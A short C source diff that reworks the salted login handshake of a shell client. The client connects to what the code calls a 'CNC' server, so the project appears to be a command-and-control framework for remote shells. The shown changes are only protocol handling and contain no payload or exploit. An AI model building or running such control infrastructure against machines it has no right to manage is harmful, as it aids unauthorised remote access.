@@ -41,8 +41,20 @@ uint64_t shell_ElemHash(const void *item, uint64_t seed0, uint64_t seed1)
 
 void shellC_handleHandshakeRes(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData)
 {
+    uint8_t saltBuf[LAIKA_HANDSHAKE_SALT_LEN];
     uint8_t endianness = laikaS_readByte(&peer->sock);
+    laikaS_read(&peer->sock, saltBuf, LAIKA_HANDSHAKE_SALT_LEN);
+
     peer->sock.flipEndian = endianness != laikaS_isBigEndian();
+
+    /* set peer salt */
+    laikaS_setSalt(peer, saltBuf);
+
+    /* send PEER_LOGIN packet */
+    laikaS_startOutPacket(peer, LAIKAPKT_PEER_LOGIN_REQ);
+    laikaS_writeByte(&peer->sock, PEER_AUTH);
+    laikaS_write(&peer->sock, saltBuf, LAIKA_HANDSHAKE_SALT_LEN);
+    laikaS_endOutPacket(peer);
 
     PRINTSUCC("Handshake accepted!\n");
 }
@@ -155,7 +167,7 @@ void shellC_handleShellClose(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *u
 struct sLaika_peerPacketInfo shellC_pktTbl[LAIKAPKT_MAXNONE] = {
     LAIKA_CREATE_PACKET_INFO(LAIKAPKT_HANDSHAKE_RES,
         shellC_handleHandshakeRes,
-        sizeof(uint8_t),
+        sizeof(uint8_t) + LAIKA_HANDSHAKE_SALT_LEN,
     false),
     LAIKA_CREATE_PACKET_INFO(LAIKAPKT_PINGPONG,
         shellC_handlePing,
@@ -280,12 +292,7 @@ void shellC_connectToCNC(tShell_client *client, char *ip, char *port)
     laikaS_endOutPacket(client->peer);
     laikaS_setSecure(client->peer, true); /* after our handshake, all packet bodies are encrypted */
 
-    /* queue authenticated handshake request */
-    laikaS_startOutPacket(client->peer, LAIKAPKT_AUTHENTICATED_HANDSHAKE_REQ);
-    laikaS_writeByte(sock, PEER_AUTH);
-    laikaS_endOutPacket(client->peer);
-
-    /* the handshake requests will be sent on the next call to shellC_poll */
+    /* the handshake request will be sent on the next call to shellC_poll */
 }
 
 bool shellC_poll(tShell_client *client, int timeout)
